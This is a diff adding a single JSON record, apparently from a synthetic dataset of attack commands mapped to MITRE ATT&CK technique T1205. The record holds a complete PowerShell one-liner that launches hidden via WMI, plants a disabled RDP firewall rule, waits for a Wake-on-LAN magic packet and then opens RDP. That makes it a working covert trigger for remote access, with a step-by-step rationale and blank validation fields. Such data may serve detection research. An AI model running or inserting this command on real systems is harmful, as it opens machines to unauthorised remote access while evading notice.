@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Enabled False }; $mac=''00-11-22-33-44-55''; $macBytes=($mac -split ''[-:]'' | ForEach-Object {[Convert]::ToByte($_,16)}); $ff=[byte[]](0xFF,0xFF,0xFF,0xFF,0xFF,0xFF); $pattern=$ff; for($i=0;$i -lt 16;$i++){ $pattern += $macBytes }; $u=New-Object System.Net.Sockets.UdpClient(9); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -ge $pattern.Length){ $ok=$true; for($i=0;$i -lt $pattern.Length;$i++){ if($d[$i] -ne $pattern[$i]){$ok=$false;break} }; if($ok){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Enabled True; break } } } }'",
+  "explanation": "Listens for a Wake-on-LAN magic packet (application-specific packet format) matching a target MAC. Upon detection, it enables a disabled Windows Firewall rule to allow RDP. This leverages traffic signaling to trigger firewall changes.",
+  "rationale_steps": [
+    "Create disabled inbound firewall rule for TCP/3389 (RDP).",
+    "Listen on UDP/9 for a WOL magic packet and verify its byte pattern (6x 0xFF + 16x MAC).",
+    "If the pattern matches, enable the RDP rule."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-f28f126a",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
